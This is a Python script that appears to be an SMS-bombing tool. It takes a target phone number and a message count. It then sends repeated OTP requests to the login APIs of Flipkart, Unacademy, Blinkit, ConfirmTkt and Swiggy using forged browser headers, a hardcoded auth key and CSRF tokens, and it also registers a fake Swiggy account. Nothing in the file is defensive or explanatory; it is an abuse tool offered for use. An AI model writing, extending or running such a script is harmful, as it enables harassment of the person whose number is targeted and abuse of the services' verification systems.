import json
import re
import requests as rq
import random

mobno = input("Enter mobile number: ")
quantity = int(input("Enter no of messages: "))



def flipkart_api():
	url = 'https://1.rome.api.flipkart.com/api/7/user/otp/generate'

	_headers = {
		'Host': '1.rome.api.flipkart.com',
		'User':'Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
		'Accept': '*/*',
		'Accept':'Language: en-US,en;q=0.5',
		'Accept':'Encoding: gzip, deflate, br',
		'Content':'Type: application/json',
		'X-User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0 FKUA/website/42/website/Desktop',
		'Origin': 'https://www.flipkart.com',
		'Sec-Fetch-Dest': 'empty',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Site': 'same-site',
		'Referer': 'https://www.flipkart.com/',
		'Connection': 'keep-alive',
		'Content-Type': 'application/json',

	}



	data = {"loginId":"+91"+mobno}
	
	request = rq.post(url, headers=_headers, json=data)

	if request.status_code == 200:
		print('Success - Flipkart')
	else:
		print('Failed - Flipkart')



def unacademy_api():
	url = 'https://unacademy.com/api/v3/user/user_check/'



	_headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
	'Accept': '*/*',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate, br',
	'Content-Type': 'application/json',
	'Content-Length': '107',
	'x-platform': '0',
	'Origin': 'https://unacademy.com',
	'Sec-Fetch-Dest': 'empty',
	'Sec-Fetch-Mode': 'cors',
	'Sec-Fetch-Site': 'same-origin',
	'Referer': 'https://unacademy.com/',
	'Connection': 'keep-alive',
	}


	data = {"phone":""+mobno,"country_code":"IN","otp_type":1,"email":"","send_otp":'true',"is_un_teach_user":'false'}

	request = rq.post(url,headers=_headers,json=data)

	if request.status_code == 200:
		print('Success - Unacademy')
	else:
		print('Failed - Unacademy')



def grofers_api():
	url = 'https://blinkit.com/v2/accounts/'

	_headers = {
		'auth_key':'15dbeedc29f8252229be1af586c485065c3c5b8d939d41f8aaae53ff14795b07',
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'
	}

	data = {
		'user_phone':""+mobno
	}


	request = rq.post(url,headers=_headers,data=data)

	if request.status_code == 200:
		print('Success - Grofers')
		return True
	else:
		print('Failed - Grofers')
		return False


def confirmtkt_api():
	url = 'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber='+mobno+'&newOtp=true&retry=false&testparamsp=true'
	
	requests = rq.get(url)
	
	if requests.json()['smsSent'] == False:
		print('Failed - Confirmtkt')
	else:
		print('Success - Confirmtkt')


def swiggy_api():
	url = 'https://www.swiggy.com/dapi/auth/sms-otp'
	
	_headers = {
	'Host': 'www.swiggy.com',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
	'Accept': '*/*',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate, br',
	'Referer': 'https://www.swiggy.com/',
	'Content-Type': 'application/json',
	'__fetch_req__': 'true',
	'Origin': 'https://www.swiggy.com',
	'Content-Length': '74',
	'Connection': 'keep-alive',
	}

	data = {"mobile":""+mobno,"_csrf":"8Nq9O994FV5N-pweL6TC2U2cGw67V6RKmVbYBE6M"}

	request = rq.post(url,headers=_headers,json=data)

	if request.json()['statusCode'] == 1:
		url = 'https://www.swiggy.com/dapi/auth/signup'

		_headers = {
			'Host': 'www.swiggy.com',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
			'Accept': '*/*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate, br',
			'Referer': 'https://www.swiggy.com/',
			'Content-Type': 'application/json',
			'__fetch_req__': 'true',
			'Origin': 'https://www.swiggy.com',
			'Content-Length': '165',
			'Connection': 'keep-alive',
		}

		data = {"mobile":""+mobno,"name":"hello","email":"123454321@yahoo.com","password":"123454321","referral":"","otp":"","_csrf":"Y3EUNMSPJWwn-Jrfj6JoXJcCI9jzToqKqcqekwKI"}

		requests = rq.post(url,headers=_headers,json=data)
		
		print('Success - Swiggy')
	
	elif request.json()['statusCode'] == 0:
		print('Success')

	else:
		print('Success - Swiggy')

	#if request.json()['statusCode'] == 1:
	#	print('Success - Swiggy')
	#else:
	#	print('Failed - Swiggy')
		

	

#for x in range(0,quantity):
#	flipkart_api()
#	unacademy_api()
#	grofers_api()
#	confirmtkt_api()
swiggy_api()